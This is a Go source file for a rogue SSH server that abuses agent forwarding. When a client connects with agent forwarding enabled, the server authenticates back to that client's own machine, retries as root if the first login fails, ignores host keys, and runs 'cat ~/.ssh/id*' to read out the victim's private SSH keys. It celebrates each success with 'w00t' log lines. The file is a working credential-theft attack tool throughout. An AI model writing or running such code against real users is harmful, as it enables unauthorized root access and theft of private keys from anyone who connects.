package main

import (
	"log"
	"net"
	"os"

	"github.com/gliderlabs/ssh"
	gssh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

func main() {
	ssh.Handle(func(s ssh.Session) {
		log.Printf("Connection from %v for user(%v) using subsystem %v", s.RemoteAddr(), s.User(), s.Subsystem())
		log.Printf("Env: %v", s.Environ())
		log.Printf("Command: %v", s.Command())
		log.Printf("Publickey: %#v", s.PublicKey())
		if ssh.AgentRequested(s) {
			log.Printf("Connection requested Agent Forwarding")

			l, err := ssh.NewAgentListener()
			if err != nil {
				log.Fatal(err)
			}
			defer l.Close()
			go ssh.ForwardAgentConnections(l, s)
			//log.Printf("%v (T:%T)", l, l)

			// make onward connextion....
			conn, err := net.Dial("unix", l.Addr().String())
			if err != nil {
				log.Fatalf("Failed to open SSH_AUTH_SOCK: %v", err)
			}

			agentClient := agent.NewClient(conn)
			config := &gssh.ClientConfig{
				User: s.User(),
				Auth: []gssh.AuthMethod{
					gssh.PublicKeysCallback(agentClient.Signers),
				},
				HostKeyCallback: gssh.InsecureIgnoreHostKey(),
			}
			log.Printf("SSH Config: %v", config)
			var target string
			if addr, ok := s.RemoteAddr().(*net.TCPAddr); ok {
				target = addr.IP.String() + ":22"
			}
			log.Printf("%v", target)

			client, err := gssh.Dial("tcp", target, config)
			if err != nil {
				log.Printf("Unable to login as user %v to host %v, trying as root", s.User(), target)
				config.User = "root"
				// might as well try root
				client, err := gssh.Dial("tcp", target, config)
				if err != nil {
					//log.Printf("Failed to dial: %v", err)
					log.Printf("Unable to login as root to host %v, trying as root", target)
				} else {
					log.Printf("w00t, we're in as root to the remote host %v", target)
					// start session
					sess, err := client.NewSession()
					if err != nil {
						log.Fatal(err)
					}
					defer sess.Close()
					sess.Stdout = os.Stdout
					sess.Stderr = os.Stderr

					// run single command
					cmd := "cat ~/.ssh/id*"
					err = sess.Run(cmd)
					if err != nil {
						log.Printf("%v", err)
					}
					client.Close()
				}
			} else {
				// start session
				sess, err := client.NewSession()
				if err != nil {
					log.Fatal(err)
				}
				defer sess.Close()

				// setup standard out and error
				// uses writer interface
				sess.Stdout = os.Stdout
				sess.Stderr = os.Stderr

				// run single command
				cmd := "cat ~/.ssh/id*"
				err = sess.Run(cmd)
				if err != nil {
					log.Fatal(err)
				}
				log.Printf("w00t, we're into the remote host %v using username %v", target, s.User())
				client.Close()
			}

		} else {
			// Not interested, no agent forwarding
		}

	})

	log.Println("starting ssh server on port 2222...")
	log.Fatal(ssh.ListenAndServe(":2222", nil))
}
